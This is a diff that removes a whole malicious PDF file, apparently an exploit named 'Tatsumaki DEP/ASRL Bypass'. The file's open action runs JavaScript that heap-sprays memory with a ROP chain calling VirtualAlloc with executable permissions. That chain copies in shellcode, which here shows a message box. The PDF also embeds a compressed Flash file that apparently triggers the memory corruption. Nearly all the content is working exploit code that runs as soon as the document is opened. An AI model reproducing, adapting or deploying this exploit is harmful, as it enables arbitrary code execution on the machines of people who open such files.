@@ -1,245 +1,0 @@
-%PDF-1.5
-1 0 obj
-<</Type/Catalog/Pages 3 0 R/OpenAction 5 0 R/AcroForm 7 0 R
->>
-endobj
-3 0 obj
-<</Type/Pages/Count 1/Kids [4 0 R]>>
-endobj
-4 0 obj
-<</Type/Page/Parent 3 0 R/Annots [9 0 R] >>
-endobj
-5 0 obj
-<</Type/Action/S/JavaScript/JS 6 0 R>>
-endobj
-6 0 obj
-<</Length 6>>
-stream
-
-		// Tatsumaki DEP/ASRL Bypass
-		// Snake ( Shahriyar.j < at > gmail )
-		// twitter.co/ponez
-		///////////////////////////////////// PADDING /////////////////////////////////////
-	var Shellcode = unescape( 
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
-		///////////////////////////////////// ROP /////////////////////////////////////
-		"%u3A59%u1000" + // eax = 0x11111110 --> 	0x10003A59 :  # ADD ESP,38 # RETN  --> ESP = eax + 0x4 + 0x38								
-		"%u0000%u0000" + // eax+0x4																					
-		"%u1237%u1001" + // eax+0x8 -> EIP --> 		0x10011237 :  # XCHG EAX,ESP # RETN 
-		"%u0000%u0000" + // eax+0xC
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u60B7%u1006" + // eax + 0x4 + 0x38 --> 0x100660B7 
-		//	100660B7   FF15 90700A10  CALL DWORD PTR DS:[<&KERNEL32.VirtualAlloc>]
-		//	100660BD   85C0           TEST EAX,EAX
-		//	100660BF   75 06          JNZ SHORT cryptocm.100660C7
-		//	100660C1   B8 13270000    MOV EAX,2713
-		//	100660C6   C3             RETN
-		//	100660C7   8B4C24 04      MOV ECX,DWORD PTR SS:[ESP+4]
-		//	100660CB   8901           MOV DWORD PTR DS:[ECX],EAX
-		//	100660CD   33C0           XOR EAX,EAX
-		//	100660CF   C3             RETN
-		"%u0000%u0000" + // Address 		= NULL
-		"%u0400%u0000" + // Size 			= 512
-		"%u1000%u0000" + // AllocationType 	= MEM_COMMIT
-		"%u0040%u0000" + // Protect 		= PAGE_EXECUTE_READWRITE
-		"%u8756%u1000" + // esp -> 	0x10008756 :  # ADD ESP,0C # POP ESI # RETN 
-		"%u0c0c%u0c0c" + // esp+0x4 --> Save Allocated Address to 0x0C0C0C0C
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u0000%u0000" + 
-		"%u90AF%u1000" + // 0x100090AF : POP ECX # RETN 	
-		"%u0BF8%u0C0C" + // Pop Into ECX ( 0x0C0C0C0C-0x14 ) 
-		"%u0FEA%u1001" + // 0x10010FEA :  # MOV EAX,DWORD PTR DS:[ECX+14] # RETN 
-		"%uCD87%u1009" + // 0x1009CD87 :  # MOV DWORD PTR SS:[ESP+8],EAX # MOV EAX,DWORD PTR SS:[ESP+8] # POP ESI # RETN 	
-		"%u0000%u0000" + 
-		"%u9E0E%u1003" + // 0x10039E0E :  # POP EDI # RETN 	
-		"%u0000%u0000" +
-		"%u9DBE%u1003" + // 0x10039DBE :  # POP ESI # RETN 	
-		"%u11C0%u1111" + // Pop Into ESI ( Shellcode Address )
-		"%uACA3%u1003" + // 0x1003ACA3 :  # POP ECX # RETN 	
-		"%u0080%u0000" + // Pop Into ECX ( Copy Size = 512/4 )
-		"%u2C50%u1000" +
-		//  10002C50   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
-		//  10002C52   5F               POP EDI
-		//  10002C53   33C0             XOR EAX,EAX
-		//  10002C55   5E               POP ESI
-		//  10002C56   C3               RETN
-		"%u0000%u0000" +
-		"%u0000%u0000" +
-		"%u90AF%u1000" + // 0x100090AF : POP ECX # RETN 	
-		"%u0BF8%u0C0C" + // Pop Into ECX ( 0x0C0C0C0C-0x14 ) 
-		"%u0FEA%u1001" + // 0x10010FEA :  # MOV EAX,DWORD PTR DS:[ECX+14] # RETN 	
-		"%u815E%u1009" + // 0x1009815E :  # MOV DWORD PTR SS:[ESP],EAX # RETN 	
-		"%u0000%u0000" +
-		///////////////////////////////////// FIXING /////////////////////////////////////
-		"%u9090%u9090" + 
-		// mov eax, fs:[0x8] 
-		// mov esp,eax 
-		// add esp,400h 
-		"%uA164%u0008%u0000%uE08B%uc481%u0400%u0000" +
-		"%u9090%u9090" +
-		///////////////////////////////////// SHELLCODE /////////////////////////////////////
-		// msgbox
-		"%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u8872%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff61%uffff%u5868%u2020%u6820%u704f%u2173%udb31%u5c88%u0424%ue389%u4468%u5821%u6820%u5750%u454e%u7568%u7473%u6820%u756f%u4a20%u6f68%u202c%u6859%u6548%u6c6c%uc931%u4c88%u1624%ue189%ud231%u406a%u5153%uff52%u31d0%u50c0%u55ff%u4108"
-		);
-		 
-	var SprayNop  = unescape( "%u0000%u0000" );
-	while (SprayNop.length + 20 + 8 < 65536) 
-		SprayNop += SprayNop;
-	SpraySlide  = SprayNop.substring(0, (0x0c0c-0x24)/2);
-	SpraySlide += Shellcode;
-	SpraySlide += SprayNop;
-	SprayData = SpraySlide.substring(0, 65536/2);
-	while(SprayData.length < 0x80000) 
-		SprayData += SprayData;
-	Absolute = SprayData.substring(0, 0x80000 - (0x1020-0x08) / 2);
-	var SprayMemory = new Array();
-	for( i = 0 ; i < 0x1f0 ; i++) 
-		SprayMemory[i] = Absolute + "O";
-		
-endstream
-endobj
-9 0 obj
-<</Type/Annot/Subtype/RichMedia/Rect [20 20 187 69] /RichMediaSettings 10 0 R/RichMediaContent 11 0 R/NM (Tatsumaki.swf)>>
-endobj
-10 0 obj
-<</Type/RichMediaSettings/Subtype/Flash/Activation 12 0 R/Deactivation 13 0 R>>
-endobj
-11 0 obj
-<</Type/RichMediaContent/Assets 14 0 R/Configurations [16 0 R]>>
-endobj
-12 0 obj
-<</Type/RichMediaActivation/Condition/PO>>
-endobj
-13 0 obj
-<</Type/RichMediaDeactivation/Condition/XD>>
-endobj
-14 0 obj
-<</Names [(Tatsumaki.swf) 15 0 R]>>
-endobj
-15 0 obj
-<</Type/Filespec /EF <</F 18 0 R>> /F(Tatsumaki.swf)>>
-endobj
-16 0 obj
-<</Type/RichMediaConfiguration/Subtype/Flash/Instances [17 0 R]>>
-endobj
-17 0 obj
-<</Type/RichMediaInstance/Subtype/Flash/Asset 15 0 R>>
-endobj
-18 0 obj
-<</Type/EmbeddedFile/Length 2247>>
-stream
-CWS
-e  x⁄}VKo[«æóIΩ-«é‚»I≠ º±≈y?GË<€m‘@Q0 ä§,÷4)êî%Øj˝!^ı't[†ª¢≈FöÆª øPø+9~§E	âºwÊÃôsæÛùoÊ¥ò˚wQ¨˛π(nîEº˙iQ∏ˆè≤(ÓOz€øéyÛÙÈp4›∆€Wwg≥£Ìv˚‰‰dÎÑoç'è€‘Z€&¨Õÿ=X‹õ>Õ:ß˜F”/ÔÏ\8à˝iw28ö∆£ÕÍΩ≥?>û}uÁŒØΩÓ[ßG«ì·ÖÀ^∑›ˆüˆG≥iõnQ8Íu∑∆ìßùŸNÁËh8Ëv*wÌ”{”√q˜…IÁYˇﬁ¡∞3=ºﬂ~gX≠ôf√˛éÎç˜˚õyÿ?›õÓ›˙ÎKì ∏˜.–ù˜“ÏT´∑∫„ßÌ£…∏w‹ELpu±¯˝%ïã£„˝·`zÿüÏèûå∆'ó[º≠l∫ì~g6˛–‚á±j~ÿ=>Ó<ÓÔ§_]ÃΩ}øà±3ÎÔ¸≤Û|ìâªõåPzF5zø˝#¥ﬂå†Ä;E\˚æ~øµÛÛÛﬂ-÷Q·&˛Áä]]\|˛“¯ˆÇäˇ}Ò¡`ˆh“y^¸ı˙÷RQ`¨8òtûˆi±VlU¶∑ñ.êﬁ:ûÜ”ˇ|÷wì æ˘p6åœˇ‡`Â“¨7ò;œõÃ˙ÀGH‰„N/ùÁ˚ß≥Ò˛`Ùß5¡•ñú∏à$¯hùàR®®Ç‰JR¡ì◊>¶òΩV1&„ß‹I+®Q©Z‡Çbôßƒ°∞Ûé‰ËCä!P√¨c∆Í,µÇ™ºÖ+È•Wƒ1À¨I—h¯b∆PÕ°X#(ÅA•‡¬:ah`*q£yÿîKc‡5Pg¢±ú≈8'1êg‘Qeü8‚∞!kã¡j·•Ë¢aI+kH ö¢±ä	àÛ—Î·ä¿?#¶ûWâöLfíE°e¥ƒíLï1⁄YÆ2A∞Y√ô	¬™ã¿$G,ôv pK¢‚L9nïÜgëwöJi∞ ‚UÆ#<seé9y+£4$e‚Ò¡RJ0cµµBÍåt·«`¿Gπ7¬hf≤1e<u“hóäSE&ÜsÕ5Jkõuê6+'ÍãLÂ‹áKÇü<•∆3¶˜Ãx·ùEJŒáÃ∞î)ÈºÃ⁄$mçå¬»ÑYö—ÇHK¢#L…Â»,G+mBÌ£∞"FœÇ@5ôêêì»Åya*ç“sùTT∞@’ﬁB}@âÇ∆aπ÷`CLƒ`ì9¬“^πî$a¯RŸ9£T‘Å2éP-u>´H¡fœ∞Ωıí`îÑ%ê)Ë ‘3∞P(Z≈¢É3dÀΩb:9C23(ù◊ŸR@ú¥÷ÑqÔµÿ:⁄àmÄ¥ƒcì PH∂ÉcöRÎHHÄc:≥‡ûOsíDÇî!GóQ-¿wº+Œ"U”E/C
-!Hs±P	.™L$-ç6[i§D√ÁD§†π≠b^QÌΩHIdE≠¿^k4êwM≤ó Øï—A[üÇ"k1RUµ /8®¯Fô∂ &<…H›!hY‡r¢£$Ò@BYë≤íA£.P"]¢R":√¥r´Å˙‘&k)c∏[‰«††CK¥ïBàV‰¡'¥ZòÀP≠™8öÄPL÷8-(ıÆûiïg≈˘ÅG&©ÑŒ‰≤ã°∫,°. é:  à[˚D£	Gc≠dTÅƒsîYTç&≤vëxb)L¢)êí ãî'’AîæH≤Iç˜<Aó wåh\à3 R_måVM†ºJ‡èÕ1f‰,T·PŒTï\r&\fNÇ¯ëeÁ°ªFäJo‚e:Kºe1b∫¨∂:0†O8QÄ%p–]jÌSÑ: ñ‡ì…2´nb‡LÇH9
-ä(çí«’÷…Qs•ﬁ\x“ ´≥Dæ]—Ÿë‘DHôd^T*®Åo0Vó∏D#Hú∆‡¿AÁÄ7ﬁKÁ®eŸä†$ÿc¿tôH‘Œ+!‰ë£	°qŒ°Ò:ùñúçAaçÄlV
-†¿Ë·Ï ﬂ!Vgáõ∞Üe(íå2öô˛÷3ú,^hÔºS‡£V$§‚ÕmT¢bü3d	ùî Jú&√'ô% ≥òŸâ4VÑB§√^8G(Œµ®†gÜ Që9åaS»“FßP¬6òfËD/óG√@Èß†Y êflRDPg¶$pÔù‡÷EÕ≤ h9Á}’qWI‹‚†£»“Ëûx†3tRúnV˜Ç˛daàüÍZ1˝‚Õ%Ï›Ã=‰mFàjÔÜ≥¡Ë˙wåÌÀ;∆Ì„ÂÔÓ˛Ô˚›Y„r:ı'∑>4˙z4ÎO:›Ÿ‡Yˇ“ÊˇqÚŸÂ\ˇYu?›N’O5ﬂôuq≈k^⁄ÃwzΩp8ˆX8ò5.ÓH5r:wt<=l˚£«≥√Â˜˝\˘ëüï∂º˙_ÆˇÔºÆÆóÎııÊç∆'ıF—(ÊW6´W6÷6Æn|¥qm}£∂⁄l‘[µ˘πÖ≈•Âï’+◊[e≠Uõk’≠z´’òo5Zı•ÖÂ≤Uªﬁöˇ∏U[øY∂Êo¥jü∂j◊Zk7[ıœZıœ[ıü4ä˜>eY˚·©>∑0WîµFY‘öeÅ´f9á±¡îÂ¸B˝å¸¨2/œ»Ÿ◊≈Ÿn£¿H≠ÜÄ6œ»›≈oœæ…ÕÚE˘œG≠≠‚èﬂΩ~µ;_>ZxΩªP¬Æﬁh-,>9#è e£oÓ÷Ûb˘bÈªﬂ/ñ∫s∑ãncÌVQ,Ïœ›˝‰ı~„`˘%æoó/Ò∞ªR‚±ˆr⁄mÏ7^¨~¸ØÛsÿ7◊Vaˇjøπ?∑ﬂ<XÓ,ˇ≠Y=c˛˚ÛÛW?«-πÜ¿ø<#˝bÔ
-Ÿ[#{W…ﬁGdÔŸõ√ﬂoãœ/>áuD∑r≠∫/øΩBˇ/ˇ9a^ 
-endstream
-endobj
-7 0 obj
-<</XFA 8 0 R>>
-endobj
-8 0 obj
-<</Length 372>>
-stream
-<?xml version="1.0" encoding="UTF-8"?>
-<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
-<config xmlns="http://www.xfa.org/schema/xci/2.6/">
-<present><pdf><interactive>1</interactive></pdf></present>
-</config>
-<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
-<subform name="form1" layout="tb" locale="en_US">
-<pageSet></pageSet>
-</subform></template></xdp:xdp>
-
-endstream
-endobj
-xref
-0 18
-0000000000 65535 f
-0000000009 00000 n
-0000000087 00000 n
-0000000139 00000 n
-0000000198 00000 n
-0000000252 00000 n
-0000000305 00000 n
-0000000443 00000 n
-0000000539 00000 n
-0000000620 00000 n
-0000000679 00000 n
-0000000740 00000 n
-0000000792 00000 n
-0000000863 00000 n
-0000000945 00000 n
-0000001016 00000 n
-0000003332 00000 n
-0000003362 00000 n
-trailer
-<</Size 18/Root 1 0 R>>
-startxref
-3783
-%%EOF
